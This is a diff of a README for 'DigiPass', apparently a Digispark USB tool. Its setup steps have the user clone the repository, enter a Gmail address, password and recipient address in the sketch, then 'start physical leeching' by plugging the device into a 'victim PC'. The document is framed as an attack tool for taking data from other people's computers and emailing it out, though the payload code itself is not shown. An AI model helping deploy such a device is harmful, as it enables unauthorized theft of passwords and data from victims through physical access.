@@ -24,10 +24,15 @@ Then download the script (sketch), open it in Arduino IDE, and enter your Gmail 
 git clone https://github.com/CharlesTheGreat77/DigiPass
 cd DigiPass/
 nano DigiPass.ino
+Line 42: Enter your GMAIL address, and Password.
 ```
-Line 42: Enter your GMAIL address, and Password. ![gmailacc](https://user-images.githubusercontent.com/27988707/124519010-13bef480-ddb6-11eb-989c-7b24a835438f.png)
-THEN, keep scrolling right and enter the address you wish to send it to. THAT'S IT! ![sender_rec](https://user-images.githubusercontent.com/27988707/124519048-30f3c300-ddb6-11eb-81b6-247c7fbe62fd.png)
+![gmailacc](https://user-images.githubusercontent.com/27988707/124519010-13bef480-ddb6-11eb-989c-7b24a835438f.png)
+```
+THEN, keep scrolling right and enter the address you wish to send it to. THAT'S IT!
+```
+![sender_rec](https://user-images.githubusercontent.com/27988707/124519048-30f3c300-ddb6-11eb-81b6-247c7fbe62fd.png)
 
+START YOUR PHYSICAL LEECHING!
 
 # In Action
 PLUG USB INTO VICTIM PC!!
